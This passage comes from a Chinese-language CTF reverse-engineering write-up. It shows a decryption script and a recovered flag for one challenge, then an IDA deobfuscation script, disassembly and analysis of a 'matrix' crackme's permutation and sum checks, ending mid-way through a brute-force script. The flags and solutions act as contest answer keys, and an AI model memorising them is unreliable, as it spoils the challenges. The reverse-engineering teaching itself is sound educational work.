<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rol</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    tmp1 = (a&amp;<span class="number">0x8000000000000000</span>)//<span class="number">0x8000000000000000</span></span><br><span class="line">    tmp2 = (b&amp;<span class="number">0x8000000000000000</span>)//<span class="number">0x8000000000000000</span></span><br><span class="line">    a = a &lt;&lt; <span class="number">1</span></span><br><span class="line">    b = b &lt;&lt; <span class="number">1</span></span><br><span class="line">    a |= tmp2</span><br><span class="line">    b |= tmp1</span><br><span class="line">    a&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">    b&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a,b</span><br><span class="line"></span><br><span class="line">a = <span class="number">0x6161616161616161</span></span><br><span class="line">b = <span class="number">0x3030303030303030</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x400</span>):</span><br><span class="line">    <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">        a^=b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a^=(~b)</span><br><span class="line">    b = ~b</span><br><span class="line">    a &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    b &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    a,b = rol(a,b)</span><br><span class="line">    tmp = a</span><br><span class="line">    a = a+b</span><br><span class="line">    b = tmp</span><br><span class="line">    a,b = rol(a,b)</span><br><span class="line">print(hex(a))</span><br><span class="line">print(hex(b))</span><br></pre></td></tr></table></figure>
<p>解密算法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ror</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    tmp1 = (a&amp;<span class="number">1</span>)*<span class="number">0x8000000000000000</span></span><br><span class="line">    tmp2 = (b&amp;<span class="number">1</span>)*<span class="number">0x8000000000000000</span></span><br><span class="line">    a = a &gt;&gt; <span class="number">1</span></span><br><span class="line">    b = b &gt;&gt; <span class="number">1</span></span><br><span class="line">    a |= tmp2</span><br><span class="line">    b |= tmp1</span><br><span class="line">    a&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">    b&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">    <span class="keyword">return</span> a,b</span><br><span class="line"></span><br><span class="line">a = <span class="number">0x50A2DCC51ED6C4A2</span></span><br><span class="line">b = <span class="number">0xA1E8895EB916B732</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x400</span>):</span><br><span class="line">    a, b = ror(a, b)</span><br><span class="line">    tmp = b</span><br><span class="line">    b = (a - b) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">    a = tmp</span><br><span class="line">    a, b = ror(a, b)</span><br><span class="line">    <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">        a^=b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        a^=(~b)</span><br><span class="line">    b = ~b</span><br><span class="line">    a&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">    b&amp;=<span class="number">0xffffffffffffffff</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    tmp = b&amp;<span class="number">0xff</span></span><br><span class="line">    b&gt;&gt;=<span class="number">8</span></span><br><span class="line">    flag+=chr(tmp)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    tmp = a&amp;<span class="number">0xff</span></span><br><span class="line">    a&gt;&gt;=<span class="number">8</span></span><br><span class="line">    flag+=chr(tmp)    </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>*CTF{fUnfl@tCf9}</p>
</blockquote>
<p>对于去混淆，我自身angr还是没有研究透彻，我就不班门弄斧了，期待一个大佬讲解</p>
<h3 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h3><p>看了下有很多冗余代码和花指令，然而没写过去除冗余代码的脚本，花指令倒是写了个脚本去除：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">bg = <span class="number">0x000027A0</span></span><br><span class="line">end = <span class="number">0x00010B80</span></span><br><span class="line">main_return = <span class="number">0x00005C10</span></span><br><span class="line">addr = bg</span><br><span class="line">print(<span class="string">'start at %08x'</span>%addr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span><span class="params">(begin,end)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(end&gt;begin):</span><br><span class="line">        PatchByte(begin,<span class="number">0x90</span>)</span><br><span class="line">        begin=begin+<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> addr+ItemSize(addr)</span><br><span class="line"><span class="keyword">while</span>(addr&lt;end):</span><br><span class="line">    next_addr =next_instr(addr)</span><br><span class="line">    MakeCode(next_addr)</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">    MakeCode(addr)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'jmp     $+5'</span> <span class="keyword">in</span> GetDisasm(addr):</span><br><span class="line">        print(<span class="string">'ret :%08x'</span>%addr)</span><br><span class="line">        patch_nop(addr,addr+<span class="number">5</span>)</span><br><span class="line">        PatchByte(addr + <span class="number">6</span>,<span class="number">0xC3</span>)</span><br><span class="line">        patch_nop(addr + <span class="number">7</span>, addr + <span class="number">9</span>)</span><br><span class="line">        addr = addr + <span class="number">9</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'xor'</span> <span class="keyword">in</span> GetDisasm(addr) <span class="keyword">and</span> GetOpnd(addr,<span class="number">0</span>) == GetOpnd(addr,<span class="number">1</span>) <span class="keyword">and</span> <span class="string">'jnz'</span> <span class="keyword">in</span> GetDisasm(addr + <span class="number">2</span>):</span><br><span class="line">        patch_nop(addr, addr + <span class="number">4</span>)</span><br><span class="line">        print(<span class="string">'xor jmp: %08x'</span>%addr)</span><br><span class="line">        patch_nop(addr, addr + <span class="number">4</span>)</span><br><span class="line">        addr = addr + <span class="number">4</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'call    $+5'</span> <span class="keyword">in</span> GetDisasm(addr):</span><br><span class="line">        print(<span class="string">'nop: %08x'</span>%addr)</span><br><span class="line">        patch_nop(addr,addr+<span class="number">0xB</span>)</span><br><span class="line">        PatchByte(addr + <span class="number">0xA</span>, <span class="number">0xE8</span>)</span><br><span class="line">        addr = addr + <span class="number">0xF</span></span><br><span class="line">print(<span class="string">'end'</span>)</span><br></pre></td></tr></table></figure>
<p>然而去掉之后仍然不能f5，于是开始对着汇编撸。。。</p>
<h4 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h4><p>由于过程中有大量冗余代码，经常会干扰我们调试，所以要胆大心细，大胆的跳过一些无用的代码，找到真正有用的代码。</p>
<p>由于是动调的地址，我这里的基地址是0x56555000，可以根据这个偏移换算到0的地址。。。</p>
<p>首先能看到一些这样的跳转代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:56559FA3 cmp     ecx, eax</span><br><span class="line">.text:56559FA5 jge     loc_5655A2A0</span><br><span class="line">.text:56559FAB jmp     loc_5655A013</span><br></pre></td></tr></table></figure>
<p>不难看出这是个循环。</p>
<p>输入后进入了第一个循环体，设内存断点跟一跟，或者直接断到跳出循环，可以发现它将输入的字符串转了hex。</p>
<p>之后在<code>5655A3A0</code>调用了函数<code>565589C7</code>，看一下栈内，参数就是转完hex的内容。</p>
<p>跟进函数，先看到一个循环，大小为字节的长度，继续跟进不难发现很多如下的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:56558BCF cmp     ecx, eax</span><br><span class="line">.text:56558BD1 jnz     loc_56558C2A</span><br></pre></td></tr></table></figure>
<p>…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:56558C79 cmp     ecx, eax</span><br><span class="line">.text:56558C7B jnz     loc_56558CB5</span><br></pre></td></tr></table></figure></p>
<p>…</p>
<p>这应该是个case或者是if elif elif …</p>
<p>对比的是我们的输入和另外18个字节，提取出来，他们是：</p>
<p>10 15 11 14 12 13<br>20 25 21 24 22 23<br>30 35 31 34 32 33</p>
<p>如果相等的话，每个又会进入一个对应的函数，之后继续循环，如果不在这些字节之内，会直接返回。<br>先不管这18个函数干了什么，直接步过到返回。<br>紧跟着在<code>5655A3D0</code>调用了函数<code>56559638</code>，步入看看做了什么。<br>这里的循环跟之前的有些许不同：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:565596B0 cmp     eax, ecx</span><br><span class="line">.text:565596B2 jge     loc_56559E3D</span><br><span class="line">.text:565596B8 mov     eax, [ebp-4]</span><br><span class="line">.text:565596BB test    eax, eax</span><br><span class="line">.text:565596BD jz      loc_56559E3D</span><br><span class="line">.text:565596C3 jmp     loc_56559727</span><br></pre></td></tr></table></figure>
<p>循环大小固定为6，每一轮结束后会test <code>ebp-4</code>的值，可以看到，初始为1，如果为0，会直接返回。可以看到最终的返回值是<code>ebp-4</code>，也就是说一旦<code>ebp-4</code>为0，就会返回0，循环完毕后它本身可能不变，也就是可能返回1。<br>看到这里有一些猜想了，这个循环可能是个check，每个循环是个单独的check，通过所有的check才会返回1，应该就拿到flag了，若返回0，可能就gg。<br>回到main函数验证一下。来到地址<code>5655A3D0</code>，稍微往下几行，看到了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:5655A409 test    eax, eax</span><br><span class="line">.text:5655A40B jz      loc_5655ABB9</span><br></pre></td></tr></table></figure>
<p>…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:5655ABB9 loc_5655ABB9:                           ; CODE XREF: .text:5655A40B↑j</span><br><span class="line">.text:5655ABB9 mov     eax, offset aTryAgain           ; &quot;Try again!&quot;</span><br><span class="line">.text:5655ABBE push    eax</span><br><span class="line">.text:5655ABBF nop</span><br><span class="line">.text:5655ABC0 nop</span><br><span class="line">.text:5655ABC1 nop</span><br><span class="line">.text:5655ABC2 nop</span><br><span class="line">.text:5655ABC3 nop</span><br><span class="line">.text:5655ABC4 nop</span><br><span class="line">.text:5655ABC5 nop</span><br><span class="line">.text:5655ABC6 nop</span><br><span class="line">.text:5655ABC7 nop</span><br><span class="line">.text:5655ABC8 nop</span><br><span class="line">.text:5655ABC9 call    near ptr _IO_puts</span><br></pre></td></tr></table></figure>
<p>果然如猜想一般，如果返回0就Try again!了。<br>如果返回1会怎样，继续往下看，又是一个循环，直接到循环结束的地方，<code>loc_5655AB90</code>，可以看到这里输出了flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:5655AB90 loc_5655AB90:                           ; CODE XREF: .text:5655A55A↑j</span><br><span class="line">.text:5655AB90 lea     eax, [ebp-180h]</span><br><span class="line">.text:5655AB96 push    eax</span><br><span class="line">.text:5655AB97 mov     eax, offset aHereIsYourFlag     ; &quot;Here is your flag: %s\n&quot;</span><br><span class="line">.text:5655AB9C push    eax</span><br><span class="line">.text:5655AB9D nop</span><br><span class="line">.text:5655AB9E nop</span><br><span class="line">.text:5655AB9F nop</span><br><span class="line">.text:5655ABA0 nop</span><br><span class="line">.text:5655ABA1 nop</span><br><span class="line">.text:5655ABA2 nop</span><br><span class="line">.text:5655ABA3 nop</span><br><span class="line">.text:5655ABA4 nop</span><br><span class="line">.text:5655ABA5 nop</span><br><span class="line">.text:5655ABA6 nop</span><br><span class="line">.text:5655ABA7 call    near ptr _IO_printf</span><br></pre></td></tr></table></figure>
<p>我们试一试直接修改check的返回值为1，然后f9。<br>当然不会输出正确的flag，而是输出了一串乱码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input your key:31313131</span><br><span class="line">Here is your flag: o�<span class="comment">#k����,��19�\���К?�q</span></span><br></pre></td></tr></table></figure>
<p>总结一下程序流程：</p>
<ol>
<li>输入若干个十六进制数，在10 15 11 14 12 13 20 25 21 24 22 23 30 35 31 34 32 33 之内。</li>
<li>根据输入，进行了一些“操作”</li>
<li>check结果</li>
<li>可能对结果又进行了一些计算，得到flag</li>
<li>打印flag，或是try again</li>
</ol>
<h4 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h4><p>让我们来看看程序到底干了什么<br>重新调试，这回输入10151114测试<br>我么把位于565589C7的函数重命名为<code>operate</code>，位于<code>56559638</code>的函数重命名为<code>check</code><br>operate函数下断，跟进到10对应的分支<code>5655BD47</code>，我们把每个这种操作函数按重命名为operate+输入的字节，如<code>operate10</code><br>慢慢步入，主体是一个长度为3的循环。<br>在5655BE7C发现取了一个data段的地址，跟入发现是一连串数据。稍微分析一下这里的结构。在下面一点发现了一连串的指针，直接打开后为修改的ida数据库是这样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.data:00013200 off_13200       dd offset dword_13020   ; DATA XREF: .text:00004796↑o</span><br><span class="line">.data:00013200                                         ; .text:000055DF↑o ...</span><br><span class="line">.data:00013204                 dd offset unk_13044</span><br><span class="line">.data:00013208                 dd offset unk_13068</span><br><span class="line">.data:0001320C                 dd offset unk_1308C</span><br><span class="line">.data:00013210                 dd offset unk_130B0</span><br><span class="line">.data:00013214                 dd offset unk_130D4</span><br><span class="line">.data:00013218 off_13218       dd offset unk_130F8     ; DATA XREF: .text:00005701↑o</span><br><span class="line">.data:00013218                                         ; .text:00005722↑o ...</span><br><span class="line">.data:0001321C                 dd offset unk_1311C</span><br><span class="line">.data:00013220                 dd offset unk_13140</span><br><span class="line">.data:00013224                 dd offset unk_13164</span><br><span class="line">.data:00013228                 dd offset unk_13188</span><br><span class="line">.data:0001322C                 dd offset unk_131AC</span><br></pre></td></tr></table></figure>
<p>这一连串的指针，中间刚好隔了0x24字节，即9个int，一共12个指针。根据题目名叫matrix，猜测是个矩阵，感觉每个元素是int的概率比较大，这里先是猜的，也就是12*9的一个矩阵。注意到这12行是分开来的，也就是说有可能是两个6*9的矩阵。<br>指针和矩阵中间又有12个int数据。这个矩阵和数据到底是做什么的暂时不知道，继续往下分析。<br>之前说了，这道题充斥着很多冗余代码，比如刚刚引用这个矩阵的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:5655BE7C mov     ebx, offset matrix</span><br><span class="line">.text:5655BE81 adc     ebx, edx</span><br><span class="line">.text:5655BE83 sbb     eax, ebx</span><br><span class="line">.text:5655BE85 lea     ebx, [eax]</span><br></pre></td></tr></table></figure>
<p>调试一下可以发现，最终ebx被幅值成了ebx的反，这根本没有意义。<br>随后的一个对矩阵的引用也是如此，再下一个有些许不同了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:5655BEE5 mov     ecx, offset matrix</span><br><span class="line">.text:5655BEEA add     ecx, eax</span><br><span class="line">.text:5655BEEC mov     eax, [ebp-4]</span><br><span class="line">.text:5655BEEF sbb     eax, edx</span><br><span class="line">.text:5655BEF1 add     eax, eax</span><br><span class="line">.text:5655BEF3 mov     eax, 0B4D418C0h</span><br><span class="line">.text:5655BEF8 lea     eax, [esi]</span><br><span class="line">.text:5655BEFA mov     eax, dword_5656829C</span><br><span class="line">.text:5655BF00 shl     eax, 0</span><br><span class="line">.text:5655BF03 add     eax, 0BE8634ABh</span><br><span class="line">.text:5655BF09 sub     eax, 70A1214Ch</span><br><span class="line">.text:5655BF0F sub     eax, 0CC322C9Bh</span><br><span class="line">.text:5655BF15 add     ecx, eax</span><br><span class="line">.text:5655BF17 xor     edx, eax</span><br><span class="line">.text:5655BF19 mov     ebx, 9F145970h</span><br><span class="line">.text:5655BF1E lea     ebx, [ebx-51A2725Fh]</span><br><span class="line">.text:5655BF24 lea     ebx, [edx+ebp*4-46h]</span><br><span class="line">.text:5655BF28 mov     edx, ecx</span><br><span class="line">.text:5655BF2A add     edx, edx</span><br><span class="line">.text:5655BF2C mov     ebx, 89B03C42h</span><br><span class="line">.text:5655BF31 lea     eax, [edi+7A2658Bh]</span><br><span class="line">.text:5655BF37 lea     eax, [eax-52554450h]</span><br><span class="line">.text:5655BF3D mov     eax, [ecx]</span><br><span class="line">.text:5655BF3F mov     [ebp-4], eax</span><br></pre></td></tr></table></figure>
<p>在ida里有相同字符的高亮，可以看出，ecx先后加了两个数据，然后终于取数据了，这里取得是matrix+8，也就是第2个元素，紧跟着存入了[ebp-4]<br>不难发现，形如mov xxx,[xxx]的代码是可疑代码，有可能是真正有用的部分，分析时要重点关注这样的代码。<br>比如在<code>5655C12C</code>发现了这样一处代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:5655C12C mov     eax, [edx]</span><br><span class="line">.text:5655C12E mov     [ecx], eax</span><br></pre></td></tr></table></figure>
<p>通过寄存器看到edx是matrix+BC的地址，也就是matrix[47]，而ecx指向的是之前的matrix[2]，这里有点像元素交换对不对，先把matrix[2]放到一个temp里，然后再把matrix[47]放到matrix[2]里<br>类似的，在<code>5655C374</code>又有一处代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:5655C374 mov     eax, [edx]</span><br><span class="line">.text:5655C376 mov     [ecx], eax</span><br></pre></td></tr></table></figure>
<p>这里应该是 matrix[47] = matrix[11]，所以不是交换元素了，继续看<br>又在下面发现了  matrix[11] = matrix[38]<br>最后，在结束循环之前，看到了  matrix[38] = temp，即是之前的matrix[2]<br>合并一下，本次循环做的事：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">temp = matrix[<span class="number">2</span>]</span><br><span class="line">matrix[<span class="number">2</span>] = matrix[<span class="number">47</span>]</span><br><span class="line">matrix[<span class="number">47</span>] = matrix[<span class="number">11</span>]</span><br><span class="line">matrix[<span class="number">11</span>] = matrix[<span class="number">38</span>]</span><br><span class="line">matrix[<span class="number">38</span>] = temp</span><br></pre></td></tr></table></figure>
<p>接下来两次循环干的应该是相似的事情了。<br>大胆猜测一下，其他17种操作应该也是某种变换。验证一下，一口气输完所有的18种输入，记录一下操作之前的矩阵，以及操作之后的矩阵<br>对比前后矩阵不难发现，虽然元素都被打乱了，但是元素的种类都没改变，还是之前的6*9个元素。<br>同时，matrix下面的一个6*9的矩阵没有被改变，应该是个常量，命名为constant好了<br>分析了两个变换之后，发现不出什么规律，比赛时就没有继续分析下去的动力了。<br>赛后想到一个可能好一点的分析方式，先将矩阵的内容patch成0-54的编号，每次输入一个不同的输入，分别记录下每次操作后的矩阵，再分析是怎么变化的。<br>试试换条思路，根据程序的流程，进行完操作之后是check，而操作的过程中矩阵元素的大小没有改变，只改变了元素的位置，我们有没有办法构造出最终过check的矩阵呢？</p>
<p>进入check函数看看如何check的：<br>循环长度为6，假设刚好对应了矩阵的每一行，<br>与之前变换的时候访问矩阵元素不太一样，这里是通过后面的6个指向矩阵的每一行的指针来访问元素的<br>用跟之前相似的方法，在<code>5655984A</code>发现了这样的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:5655984A mov     edx, [eax]</span><br><span class="line">.text:5655984C mov     eax, [ecx]</span><br><span class="line">.text:5655984E add     edx, eax</span><br></pre></td></tr></table></figure>
<p>这里加的是matrix[0]和matrix[2]</p>
<p>接下来跟着edx走不难发现一些类似的代码，最终的效果就是<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">temp = matrix[<span class="number">0</span>]+matrix[<span class="number">2</span>]+matrix[<span class="number">4</span>]+matrix[<span class="number">6</span>]+matrix[<span class="number">8</span>]</span><br></pre></td></tr></table></figure></p>
<p>刚好把偶数下标的元素求和了，然后不远处又能发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:56559A8B cmp     edx, eax</span><br><span class="line">.text:56559A8D mov     eax, 0</span><br><span class="line">.text:56559A92 setz    al</span><br><span class="line">.text:56559A95 mov     ecx, [ebp-4]</span><br><span class="line">.text:56559A98 and     ecx, eax</span><br><span class="line">.text:56559A9A mov     eax, ecx</span><br><span class="line">.text:56559A9C adc     eax, ebx</span><br><span class="line">.text:56559A9E lea     eax, [esi]</span><br><span class="line">.text:56559AA0 sbb     edx, edx</span><br><span class="line">.text:56559AA2 sub     eax, ecx</span><br><span class="line">.text:56559AA4 mov     edx, 51160ED1h</span><br><span class="line">.text:56559AA9 lea     edx, [esi+2Ah]</span><br><span class="line">.text:56559AAC mov     ebx, 66600294h</span><br><span class="line">.text:56559AB1 lea     eax, [ebx+0Fh]</span><br><span class="line">.text:56559AB4 mov     eax, 0F4B4E967h</span><br><span class="line">.text:56559AB9 mov     eax, 13E96DD7h</span><br><span class="line">.text:56559ABE lea     edx, [esp+edi*4-0Dh]</span><br><span class="line">.text:56559AC2 mov     [ebp-4], ecx</span><br></pre></td></tr></table></figure>
<p>这里的edx是求和的结果，eax跟过去一看，是之前那12个不知道有啥用的数据中的第一个，命名为cmp好了。<br>比较的结果果然被放在了[eb-4]中<br>继续往下跟，不难看到第二个比较，不同的，这次求和的内容并不是奇数下标的元素，而是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">temp = matrix[<span class="number">1</span>]+matrix[<span class="number">3</span>]+matrix[<span class="number">4</span>]+matrix[<span class="number">5</span>]+matrix[<span class="number">6</span>]</span><br></pre></td></tr></table></figure>
<p>在两次过程中matrix[4]都被加进去了，最终比较的对象是cmp[1]<br>猜测一下check过程。cmp是个6*2的矩阵。每次比较matrix的每一行，下标为02468的元素求和要为cmp[i][0]，下标为13457的元素求和要为cmp[i][1]<br>稍微验证一下之后的循环，下标果然如此</p>
<h4 id="穷举求解"><a href="#穷举求解" class="headerlink" title="穷举求解"></a>穷举求解</h4><p>既然相加的元素都在这6*9个之中，我们只要找到某5个元素，加和等于cmp就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line">a = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">54</span>)]</span><br><span class="line">mat = [<span class="number">0x0FDFE0BA1</span>, <span class="number">0x9A915052</span>, <span class="number">0x0C96F3527</span>, <span class="number">0x0F5201FCD</span>, <span class="number">0x0FE32ED8F</span>, <span class="number">0x0DB8E3EF9</span>, <span class="number">0x51EF954</span>, <span class="number">0x0FE217F1C</span>, <span class="number">0x7B33A8BB</span>, <span class="number">0x9CF903A1</span>, <span class="number">0x0C381E2CD</span>, <span class="number">0x22B35BE4</span>, <span class="number">0x4550E6AE</span>, <span class="number">0x0DC9E8F3C</span>, <span class="number">0x0A9B44EAF</span>, <span class="number">0x3372486A</span>, <span class="number">0x51329F58</span>, <span class="number">0x5F2F456E</span>, <span class="number">0x9B555A08</span>, <span class="number">0x0EB1A8529</span>, <span class="number">0x9B009084</span>, <span class="number">0x9B0B7B06</span>, <span class="number">0x9967F311</span>, <span class="number">0x91FB13AB</span>, <span class="number">0x18952236</span>, <span class="number">0x6F7B9915</span>, <span class="number">0x0EDD9D6D1</span>, <span class="number">0x0FB67FE21</span>, <span class="number">0x259911B0</span>, <span class="number">0x3DC4EE74</span>, <span class="number">0x98936FF0</span>, <span class="number">0x0DF7502CE</span>, <span class="number">0x0C3DF1016</span>, <span class="number">0x0BC1220F9</span>, <span class="number">0x0F54C810C</span>, <span class="number">0x715A634C</span>, <span class="number">0x3E1637A6</span>, <span class="number">0x80F07B8D</span>, <span class="number">0x0FB9CA491</span>, <span class="number">0x0AD254C2E</span>, <span class="number">0x0FB5A012F</span>, <span 